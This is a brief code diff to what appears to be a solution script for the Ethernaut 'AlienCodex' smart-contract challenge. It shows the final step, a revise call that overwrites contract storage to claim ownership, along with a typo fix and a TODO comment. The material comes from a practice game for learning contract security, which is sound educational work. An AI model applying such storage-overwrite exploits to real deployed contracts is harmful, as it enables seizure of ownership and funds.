@@ -42,13 +42,14 @@ const attackAlienCodex = async () => {
     const tx3 = await contract.revise(i, _content);
     const tx3Receipt = await tx3.wait(1);
     console.log(tx3Receipt);
+    // TODO: fix confirmation below
     // const own = await contract.owner();
     // const owner = await own.wait(1);
     // console.log(owner);
     // const pass = (await contract.owner()) === playerAddress;
     // console.log(`Claimed ownership and passed this level: ${pass}`);
     console.log(
-        "Attack done, check if you claimed ownership by typing 'await contract.owner() === player' on ethernaut console, it will show true if you suceed"
+        "Attack done, check if you claimed ownership by typing 'await contract.owner() === player' on ethernaut console, it will show true if you succeeded"
     );
 };
 
